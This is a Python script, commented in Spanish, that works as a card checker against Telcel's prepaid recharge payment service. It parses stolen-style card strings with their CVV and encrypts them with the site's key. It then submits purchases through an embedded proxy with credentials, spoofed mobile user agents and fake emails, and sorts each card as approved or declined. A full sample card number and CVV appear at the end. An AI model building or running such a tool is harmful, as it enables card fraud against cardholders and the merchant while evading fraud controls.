import json, requests, random, sys, traceback
from Crypto.PublicKey import RSA
from Crypto.Cipher import PKCS1_v1_5
from fake_useragent import UserAgent
from faker import Faker

""" Proxy. EL FORMATO ES EN http://user:pass@host:port o http://ip:port """
prxy = "http://b4ab6bbd7b83fecd-geo-mx:7ad3a6559050089d@gate-eu.vaultproxies.com:80"
#End proxy

class RSAEncrypt: # Clase que encripta la tarjeta * SP
    PUBLIC_KEY = """-----BEGIN PUBLIC KEY-----
MIIBIjANBgkqhkiG9w0BAQEFAAOCAQ8AMIIBCgKCAQEAhbpFGF0cH3BAYtyCtGEP
FZkOQRMB1YDGB076KeU3kOKMgRQfX8UbSZ4SiBoYdiLnIoU/Oy4tb0soOvgIBXHN
Vvr4RLAZsf/3Xfwth4fQi1d+UbRTOYuBGBQm/hipRdjYhAhb4GDc97CSNSXD93nn
HbgZUmZzKCIuV15mt8nmAjIaUxaDXf6x56pVLzzBnpE5si4xDfnWRXrVLyIWuN0K
tXOcg90bDzNGW+EZpdI75mPSED2/LxqbDIKMQeFjJS6DKsJtolLnUjMl+DdPmT2p
22AzhNN7LQNJ8c0/rOy9z+LwBFQRWD09ffY3AeoWXzvhgbgdUync24Eu6OvhBOJR
PwIDAQAB
-----END PUBLIC KEY-----"""
    def __init__(self):
        self.cipher = PKCS1_v1_5.new(RSA.import_key(self.PUBLIC_KEY))
    def encrypt(self, data):
        if isinstance(data, str):
            data = data.encode()
        return self.cipher.encrypt(data).hex().upper()

rsa = RSAEncrypt()
def build(card):
    card = card.strip().replace(" ", "").replace("/", "|").replace(":", "|")
    num, mes, ano, cvv = card.split("|")
    mes = "0"+mes if len(mes)==1 else mes
    ano = ano[-2:] if len(ano)==4 else ano
    exp = f"{mes}/{ano}"
    return {"token": rsa.encrypt(json.dumps({"card": num,"expDate": exp}, separators=(",", ":"))),"cvv": rsa.encrypt(cvv.strip()),"type": ("VISA" if num.startswith("4") else "MASTERCARD" if num.startswith(("51", "52", "53", "54", "55")) else "AMEX" if num.startswith(("34", "37")) else "UNKNOWN")}


########### CONFIGURACION DE MONTOS ###########
data=[{"monto":100,"key":"pkg_64","vigencia":"60 días"},{"monto":20,"key":"pkg_60","vigencia":"10 días"},{"monto":30,"key":"pkg_61","vigencia":"15 días"},{"monto":50,"key":"pkg_62","vigencia":"30 días"},{"monto":80,"key":"pkg_63","vigencia":"30 días"},{"monto":150,"key":"pkg_65","vigencia":"60 días"},{"monto":200,"key":"pkg_66","vigencia":"60 días"},{"monto":300,"key":"pkg_67","vigencia":"60 días"},{"monto":500,"key":"pkg_68","vigencia":"60 días"}]
def get_montos(monto):
    paquete=next((p for p in data if p["monto"]==monto),None) # Obtiene un paquete general basandose en el mongo dado
    if paquete:
        return {'vigencia':paquete["vigencia"],'key_id':paquete["key"]}
    return None
###########№########################################
fake = Faker("es_MX")
get_ua = lambda: UserAgent(platforms='mobile').random
email = lambda: f"{fake.user_name()}@{random.choice(["gmail.com", "yahoo.com", "live.mx", "outlook.com"])}"
post_code = random.randint(10000, 16999)

def _json(res: requests.Response):
    try:
        return res.json()
    except (ValueError, json.JSONDecodeError):
        return {}

#Funcion principal
def main(ccs, monto, num):
    with requests.Session() as session:
        try:
            ua = get_ua()
            if prxy:
                prx = {"http": prxy, "https":prxy}
                session.proxies.update(prx)
            postal_code = random.randint(10000, 16999)
            headers = { "Host": "www.telcel.com", "Connection": "keep-alive", "sec-ch-ua-platform": "\"Android\"","Cache-Control": "no-store, no-cache, must-revalidate, max-age=0", "User-Agent": ua,  "Pragma": "no-cache",  "sec-ch-ua-mobile": "?1", "Accept": "*/*", "Sec-GPC": "1", "Accept-Language": "es-MX,es;q=0.6",  "Sec-Fetch-Site": "same-origin", "Sec-Fetch-Mode": "cors", "Sec-Fetch-Dest": "empty", "Referer": "https://www.telcel.com/personas/compra-paquetes-y-recargas", "Accept-Encoding": "gzip, deflate, br, zstd"}
            res = session.get("https://www.telcel.com/bin/telcelcom/payment/token?device=MOBILE&module=PAQUETES_Y_RECARGAS&return_url=%2Fpersonas%2Fcompra-paquetes-y-recargas.html&family_keys=SIN_LIMITE", headers=headers)
            token1 = res.text
            print(token1)
            if "ey" not in token1:
                return {"number": num, "monto": monto, "status": "Error ⚠️", "message": "Token not found"}
            
            headers = { 
                "sec-ch-ua-platform": "\"Android\"",
                "authorization": f"Bearer {token1.strip()}",
                "user-agent": ua,
                "accept": "application/json, text/plain, */*",
                "sec-ch-ua-mobile": "?1", 
                "sec-gpc": "1",
                "accept-language": "es-MX,es;q=0.6",
                "origin": "https://paymentservice.telcel.com",
                "sec-fetch-site": "same-origin",
                "sec-fetch-mode": "cors",
                "sec-fetch-dest": "empty",
                "referer": "https://paymentservice.telcel.com/payments/",
                "priority": "u=1, i", 
                "uzlc": "7f9000bcd84e79-07b8-4fbc-97e2-11abf7e275141-17697602171230-0020155235292a387ba1010160219141uPvSx3ffcf1dd8",
            }
            _j = _json(res)
            sessionid = _j.get("sessionId")
            web_sess = _j.get("webSession")
            headers = {"sec-ch-ua-platform": "\"Android\"", "authorization": f"Bearer {token1}",  "sec-ch-ua-mobile": "?1",  "user-agent": ua, "accept": "application/json, text/plain, */*", "content-type": "application/json", "sec-gpc": "1", "accept-language": "es-MX,es;q=0.6",  "origin": "https://paymentservice.telcel.com","sec-fetch-site": "same-origin","sec-fetch-mode": "cors", "sec-fetch-dest": "empty", "referer": "https://paymentservice.telcel.com/payments/", "accept-encoding": "gzip, deflate, br, zstd", "priority": "u=1, i"}
            encDta= build(ccs); numc=encDta.get("token", ""); cvv=encDta.get("cvv", "");type=encDta.get('type','')
            resultm = get_montos(int(monto))
            if not resultm:
                return {"number": num, "monto": monto, "status": "Error ⚠️", "message": f"Monto inválido: selecciona un monto válido (20, 30, 50, 80, 100, 150, 200, 300, 500)"}
            data ={"isAuth": False, "service": { "type": "RECARGA", "operationType": 2, "productType": 1, "planType": 1, "productCode": "", "mdn": num,"region": 5,  "tipoPerfil": "AMIGO", "planName": "RECARGA_SALDO", "price": int(monto),  "idproduct": resultm["key_id"], "validity": resultm["vigencia"] }, "accountId": None,"email": email(),"fingerprint": { "organizationId": "gp9h38j0", "sessionId": sessionid, "webSession": web_sess }, "postalCode": post_code,"isSavedCard": False,"cardType": type,"tokenCard": numc,"lastDigits": ccs.split("|")[0][-4:]}
            res = session.post("https://paymentservice.telcel.com/api/services/recharge/prepareOrder", headers=headers, json=data)
            if "paymentId" in res.text:
                paymentid=_json(res).get("paymentId")
            else:
                return {"number": num, "monto": monto, "status": "Declined ❌", "message": res.text[:200], "card": ccs.strip(), "status_resp": res.status_code}
            headers = { "sec-ch-ua-platform": "\"Android\"", "authorization": f"Bearer {token1}", "sec-ch-ua-mobile": "?1", "user-agent": ua,"accept": "application/json, text/plain, */*", "content-type": "application/json","sec-gpc": "1", "accept-language": "es-MX,es;q=0.6", "origin": "https://paymentservice.telcel.com", "sec-fetch-site": "same-origin", "sec-fetch-mode": "cors","sec-fetch-dest": "empty",  "referer": "https://paymentservice.telcel.com/payments/"}
            data = {"generalInfo": {"mdn": num, "encryptedCvv": cvv, "userName": ""}, "vestaRequest": { "organizationId": "gp9h38j0","sessionKey": sessionid, "webSessionId": web_sess, "isRecurring": False}, "paymentId": paymentid}
            res = session.post("https://paymentservice.telcel.com/api/services/recharge/confirmOrder", headers=headers, json=data, allow_redirects=False)
            resp_text = res.text
            if "TRANSACCION_EXITOSA" in resp_text or "folioMotor" in resp_text or "folioTelcel" in resp_text or "operationDate" in resp_text:
                datas=_json(res);ftc=datas.get("folioTelcel", "Null");ftm=datas.get("folioMotor", "Null");provee = datas.get("provider", "FONYOU")
                return {"number": num, "monto": monto, "status": "Approved ✅", "message": "Recarga exitosa", "folio_telcel": ftc, "folio_motor":ftm, "proveedor": provee, "card": ccs.strip()}
            elif "FONDOS_INSUFICIENTES" in resp_text:
                return  {"number": num, "monto": monto, "status": "Declined ❌", "description": _json(res).get("message", "Declined ❌"), "card": ccs.strip()}
            elif "La transacción fue rechazada por el banco." in resp_text or "Lamentamos el inconveniente, por favor," in resp_text or "RECHAZO_BANCARIO" in resp_text:
                _j = _json(res)
                dm = "Recarga no enviada por error en cargo" if "Código de rechazo en respuesta (01) del mensaje tipo: 01: id: N/A" in _j.get("description", "Declined ❌") else _j.get("message", "Declined ❌")
                return {"number": num, "monto": monto, "status": "Declined ❌", "message": dm, "card": ccs.strip()}
            else:
                return {"number": num, "monto": monto, "status": "Declined ❌", "message": resp_text[:200], "card": ccs.strip(), "status_resp": res.status_code}
        except Exception as e:
            return {"number": num, "monto": monto, "status": "Error ⚠️", "message": str(e)[:200]}

if __name__ == "__main__":
    num = "5548448605"
    cards = "4599858290851419|12|2026|985"
    monto = 20
    print(main(cards, monto, num))

